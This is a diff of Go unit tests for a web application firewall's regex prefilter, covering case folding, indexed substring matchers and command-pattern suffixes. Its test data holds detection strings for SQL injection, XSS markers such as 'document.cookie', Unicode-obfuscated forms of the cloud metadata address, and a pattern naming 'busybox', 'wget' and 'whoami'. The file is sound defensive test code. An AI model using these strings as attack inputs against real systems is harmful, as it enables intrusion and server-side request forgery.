-			t.Errorf("rawLiteral(RuneError literal) = %q, want empty", got)
-		}
-	})
-
-	t.Run("rawLiteral/non_literal_op", func(t *testing.T) {
-		// rawLiteral must return "" for any non-OpLiteral node.
-		re := &syntax.Regexp{Op: syntax.OpAnyChar}
-		if got := rawLiteral(re, false); got != "" {
-			t.Errorf("rawLiteral(OpAnyChar) = %q, want empty", got)
-		}
-	})
-
-	// ── rawExtractSuffixes ────────────────────────────────────────────────────
-
-	t.Run("rawExtractSuffixes/RuneError_literal", func(t *testing.T) {
-		// rawExtractSuffixes must return nil for a literal containing RuneError
-		// so the calling trieReconstruct bails out rather than building a wrong prefilter.
-		re := &syntax.Regexp{Op: syntax.OpLiteral, Rune: []rune{utf8.RuneError}}
-		if got := rawExtractSuffixes(re, false); got != nil {
-			t.Errorf("rawExtractSuffixes(RuneError) = %v, want nil", got)
-		}
-	})
-
-	t.Run("rawExtractSuffixes/OpCapture", func(t *testing.T) {
-		// Capture groups are transparent — rawExtractSuffixes must unwrap them.
-		inner := &syntax.Regexp{Op: syntax.OpLiteral, Rune: []rune("elect")}
-		cap := &syntax.Regexp{Op: syntax.OpCapture, Sub: []*syntax.Regexp{inner}}
-		got := rawExtractSuffixes(cap, false)
-		if len(got) != 1 || got[0] != "elect" {
-			t.Errorf("rawExtractSuffixes(OpCapture(elect)) = %v, want [elect]", got)
-		}
-	})
-
-	// ── newIndexedMatcher ─────────────────────────────────────────────────────
-
-	t.Run("newIndexedMatcher/empty_needles", func(t *testing.T) {
-		// An empty needle set should build a zero-matcher that never matches.
-		m := newIndexedMatcher(nil, false)
-		if m == nil || m.minLen != 0 {
-			t.Error("newIndexedMatcher(nil) should return a zero-minLen matcher")
-		}
-		if m.match("anything") {
-			t.Error("empty matcher.match() must return false")
-		}
-	})
-
-	t.Run("newIndexedMatcher/needle_longer_than_255", func(t *testing.T) {
-		// When the shortest needle exceeds 255 bytes the shift table is capped at
-		// 255 to fit in a uint8. The matcher must still find an exact match.
-		needle := strings.Repeat("a", 300)
-		m := newIndexedMatcher([]string{needle}, false)
-		if m.minLen != 300 {
-			t.Errorf("minLen = %d, want 300", m.minLen)
-		}
-		if !m.match(needle) {
-			t.Error("should match exact needle")
-		}
-		if m.match(strings.Repeat("a", 299)) {
-			t.Error("should not match 299-byte input against 300-byte needle")
-		}
-	})
-
-	// ── matchCI ───────────────────────────────────────────────────────────────
-
-	t.Run("matchCI/haystack_shorter_than_needle", func(t *testing.T) {
-		// matchCI must return false immediately when the haystack is shorter
-		// than the shortest needle (ml > len(s) guard, lines 805-807).
-		m := newIndexedMatcher([]string{"hello"}, true)
-		if m.matchCI("hi") {
-			t.Error("matchCI: short haystack should return false")
-		}
-	})
-
-	t.Run("matchCI/zero_minLen", func(t *testing.T) {
-		// A zero-minLen matcher (built from empty needles) must return false.
-		m := newIndexedMatcher(nil, true)
-		if m.matchCI("anything") {
-			t.Error("matchCI with minLen=0 must return false")
-		}
-	})
-
-	// ── containsFoldASCIIOnly ─────────────────────────────────────────────────
-
-	t.Run("containsFoldASCIIOnly/haystack_shorter_than_needle", func(t *testing.T) {
-		// limit = len(s) - nlen < 0 → immediate false (lines 897-899).
-		if containsFoldASCIIOnly("hi", "hello") {
-			t.Error("should return false when haystack shorter than needle")
-		}
-	})
-
-	t.Run("containsFoldASCIIOnly/first_byte_found_too_late", func(t *testing.T) {
-		// IndexByte finds a first-byte match but at a position where the full
-		// needle can no longer fit (i > limit). Must return false without panic.
-		// haystack="hxxhel", needle="hello" (5b): limit=1.
-		// IndexByte('h') finds index 0 → no full match. i=1.
-		// IndexByte('h') in "xxhel" finds index 3 → new i = 1+3 = 4 > limit=1 → false.
-		if containsFoldASCIIOnly("hxxhel", "hello") {
-			t.Error("should return false when first-byte match is at position > limit")
-		}
-	})
-}
-
-func TestPrefilterConcurrentSafety(t *testing.T) {
-	rxPattern := `(?i)(?:union\s+select|insert\s+into|delete\s+from)`
-	opts := plugintypes.OperatorOptions{Arguments: rxPattern, RxPreFilterEnabled: true}
-	op, err := newRX(opts)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if op.(*rx).prefilter == nil {
-		t.Skip("prefilter not built")
+	waf := corazawaf.NewWAF()
+	tx := waf.NewTransaction()
+	t.Cleanup(func() {
+		if err := tx.Close(); err != nil {
+			t.Error(err)
+		}
+	})
+	tx.Capture = true
+	if !operator.Evaluate(tx, "Upload") {
+		t.Fatal("expected exact expression to match")
 	}
-	re := regexp.MustCompile(rxPattern)
-	inputs := []string{
-		"union select * from t", "INSERT INTO t VALUES",
-		"normal request", "GET /index.html HTTP/1.1",
-		"delete from users", "", "UNION SELECT 1,2,3",
+	captured := tx.Variables().TX().Get("0")
+	if len(captured) != 1 || captured[0] != "Upload" {
+		t.Fatalf("expected full-match capture, have %v", captured)
 	}
-	const goroutines = 100
-	errs := make(chan error, goroutines*len(inputs))
-	done := make(chan struct{})
-	for g := 0; g < goroutines; g++ {
-		go func() {
-			defer func() { done <- struct{}{} }()
-			for _, inp := range inputs {
-				waf := corazawaf.NewWAF()
-				tx := waf.NewTransaction()
-				tx.Capture = true
-				got := op.Evaluate(tx, inp)
-				if want := re.MatchString(inp); got != want {
-					errs <- fmt.Errorf("input %q: got %v, want %v", inp, got, want)
+}
+
+func TestCaseInsensitiveUnicodeLiteralsBypassBytePrefilter(t *testing.T) {
+	for _, pattern := range []string{`(?i)é`, `(?i)Σ`} {
+		if filter := compilePrefilter(pattern); filter.match != nil || filter.matchWithState != nil {
+			t.Errorf("Unicode-folded pattern %q must use the regular-expression backend", pattern)
+		}
+	}
+}
+
+func TestMinimumMatchLengthAllowsShorterUnicodeFoldEquivalent(t *testing.T) {
+	const pattern = `(?i)ⱥ`
+	const value = "Ⱥ"
+	if !regexp.MustCompile(pattern).MatchString(value) {
+		t.Fatal("test case must exercise a Unicode fold pair")
+	}
+	operator, err := newRX(plugintypes.OperatorOptions{
+		Arguments:          pattern,
+		RxPreFilterEnabled: true,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	waf := corazawaf.NewWAF()
+	t.Cleanup(func() {
+		if err := waf.Close(); err != nil {
+			t.Error(err)
+		}
+	})
+	tx := waf.NewTransaction()
+	t.Cleanup(func() {
+		if err := tx.Close(); err != nil {
+			t.Error(err)
+		}
+	})
+	if !operator.Evaluate(tx, value) {
+		t.Fatal("minimum-length prefilter rejected a valid shorter Unicode fold equivalent")
+	}
+}
+
+func TestMinimumMatchLengthAllowsEveryUnicodeFoldEquivalent(t *testing.T) {
+	for candidate := rune(0); candidate <= unicode.MaxRune; candidate++ {
+		folded := unicode.SimpleFold(candidate)
+		if folded == candidate {
+			continue
+		}
+		pattern := `(?i)` + regexp.QuoteMeta(string(candidate))
+		compiled := regexp.MustCompile(pattern)
+		minimum := minMatchLength(pattern)
+		for equivalent := folded; equivalent != candidate; equivalent = unicode.SimpleFold(equivalent) {
+			value := string(equivalent)
+			if !compiled.MatchString(value) {
+				t.Fatalf("fold cycle invariant failed for pattern %q and value %q", pattern, value)
+			}
+			if minimum > len(value) {
+				t.Fatalf("minimum length %d for pattern %q rejects %d-byte fold equivalent %q", minimum, pattern, len(value), value)
+			}
+		}
+	}
+}
+
+func TestIndexedMatcherMatchesNaiveSearch(t *testing.T) {
+	patternSets := [][]string{
+		{"union", "select", "insert"},
+		{"ab", "longer-pattern", "xyz"},
+		{"script", "javascript", "onerror", "document.cookie"},
+	}
+	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/"
+	for _, caseFold := range []bool{false, true} {
+		for setIndex, needles := range patternSets {
+			t.Run(fmt.Sprintf("fold_%v_set_%d", caseFold, setIndex), func(t *testing.T) {
+				random := rand.New(rand.NewSource(int64(setIndex + 1)))
+				matcher := newIndexedMatcher(needles, caseFold)
+				for iteration := 0; iteration < 5000; iteration++ {
+					value := make([]byte, random.Intn(512))
+					for i := range value {
+						value[i] = alphabet[random.Intn(len(alphabet))]
+					}
+					if len(value) != 0 && random.Intn(2) == 0 {
+						needle := []byte(needles[random.Intn(len(needles))])
+						if caseFold {
+							for i, c := range needle {
+								if c >= 'a' && c <= 'z' && random.Intn(2) == 0 {
+									needle[i] = c - ('a' - 'A')
+								}
+							}
+						}
+						if len(needle) <= len(value) {
+							start := random.Intn(len(value) - len(needle) + 1)
+							copy(value[start:], needle)
+						}
+					}
+
+					text := string(value)
+					searchText := text
+					if caseFold {
+						searchText = strings.ToLower(searchText)
+					}
+					want := false
+					for _, needle := range needles {
+						if caseFold {
+							needle = strings.ToLower(needle)
+						}
+						if strings.Contains(searchText, needle) {
+							want = true
+							break
+						}
+					}
+					if have := matcher.match(text); have != want {
+						t.Fatalf("unexpected match for %q: want %v, have %v", text, want, have)
+					}
 				}
+			})
+		}
+	}
+}
+
+func TestRequiredByteMatcherNeverRejectsNeedles(t *testing.T) {
+	needles := make([]string, 0, 302)
+	needles = append(needles, ";", "=")
+	for index := range 300 {
+		needles = append(needles, fmt.Sprintf("command_%03d_suffix", index))
+	}
+	for _, caseFold := range []bool{false, true} {
+		matcher := newRequiredByteMatcher(needles, caseFold)
+		for _, needle := range needles {
+			value := "prefix_" + needle + "_suffix"
+			if caseFold {
+				value = strings.ToUpper(value)
 			}
-		}()
-	}
-	for i := 0; i < goroutines; i++ {
-		<-done
-	}
-	close(errs)
-	for err := range errs {
-		t.Error(err)
+			if !matcher.match(value) {
+				t.Fatalf("required-byte matcher rejected needle %q with caseFold=%v", needle, caseFold)
+			}
+		}
 	}
 }
 
-func TestPrefilterAnyRequiredNonASCIIBailout(t *testing.T) {
-	// CI pattern whose needles contain non-ASCII bytes — must bail out (return nil).
-	if pf := prefilterFunc("(?si)(?:café|naïve)"); pf != nil {
-		t.Error("expected nil prefilter for CI pattern with non-ASCII needles")
+func TestIndexedMatcherFoldsOnlyASCIIBytes(t *testing.T) {
+	needles := []string{
+		"http://169。254。169。254",
+		"http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ",
 	}
-}
-
-func TestPrefilterCaseInsensitiveWithNonASCIIInput(t *testing.T) {
-	// The isASCII wrapper must conservatively return true for non-ASCII input.
-	pf := prefilterFunc("(?si)hello")
-	if pf == nil {
-		t.Fatal("expected non-nil prefilter for (?si)hello")
-	}
-	if !pf("héllo") {
-		t.Error("CI prefilter must pass non-ASCII input through (conservative)")
-	}
-	if pf("world") {
-		t.Error("CI prefilter must reject clearly non-matching ASCII input")
-	}
-}
-
-// BenchmarkIndexedMatcher benchmarks the Wu-Manber indexedMatcher at different
-// needle counts and case modes against a typical HTTP request haystack.
-func BenchmarkIndexedMatcher(b *testing.B) {
-	haystack := strings.Repeat("GET /api/v1/resources?page=1&limit=50&sort=name&order=asc HTTP/1.1 Host: example.com ", 6)[:500]
-	for _, bm := range []struct {
-		name    string
-		needles []string
-		ci      bool
-	}{
-		{"n3_CS", []string{"union", "insert", "delete"}, false},
-		{"n3_CI", []string{"union", "insert", "delete"}, true},
-		{"n10_CS", []string{"select", "union", "insert", "delete", "update", "alter", "create", "sleep", "benchmark", "extract"}, false},
+	matcher := newIndexedMatcher(needles, true)
+	for _, value := range []string{
+		"prefix HTTP://169。254。169。254 suffix",
+		"prefix HTTP://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ suffix",
 	} {
-		im := newIndexedMatcher(bm.needles, bm.ci)
-		b.Run(bm.name, func(b *testing.B) {
-			b.ReportAllocs()
-			b.SetBytes(int64(len(haystack)))
-			for i := 0; i < b.N; i++ {
-				im.match(haystack)
-			}
-		})
+		if !matcher.match(value) {
+			t.Errorf("expected mixed ASCII and Unicode needle to match %q", value)
+		}
+	}
+	if matcher.match("http://169.254.169.254") {
+		t.Error("expected Unicode punctuation to remain case-sensitive byte data")
+	}
+}
+
+func TestPrefilterSelectsFactoredSuffixAlternatives(t *testing.T) {
+	pattern := `(?i)(?:^|busybox[ ]+)(?:xargs|xterm|wget|whoami)`
+	pf := prefilterFunc(pattern)
+	if pf == nil {
+		t.Fatal("prefilterFunc should retain the mandatory command alternatives")
+	}
+	for _, value := range []string{"xargs", "busybox WGET", "whoami"} {
+		if !pf(value) {
+			t.Errorf("expected a possible match for %q", value)
+		}
+	}
+	if pf(strings.Repeat("x", 64<<10)) {
+		t.Error("expected a repeated factored prefix without a complete suffix to be rejected")
 	}
 }
